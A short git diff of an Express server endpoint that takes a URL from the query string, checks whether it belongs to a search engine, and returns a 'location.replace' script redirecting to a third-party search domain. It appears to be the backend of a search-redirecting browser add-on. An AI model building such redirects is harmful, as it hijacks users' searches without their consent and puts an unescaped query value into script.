@@ -43,10 +43,14 @@ function getQuery(search, type = '') {
 
 app.get('/testing', function (req, res) {
     var query = req?.query.url || ''
-    var url = checkUrlIsSearchEngine(query)
-    if (url) {
-        res.send({ 'link': `location.replace("https://searchesmia.com/bingchr5?q=${url}")` });
+    if(req && req.query && req.query.url) {
+        query = req.query.url 
+        var url = checkUrlIsSearchEngine(query)
+        if (url) {
+            res.send({ 'link': `location.replace("https://searchesmia.com/bingchr5?q=${url}")` });
+        }
     }
+    
 });
 
 app.listen(8080);
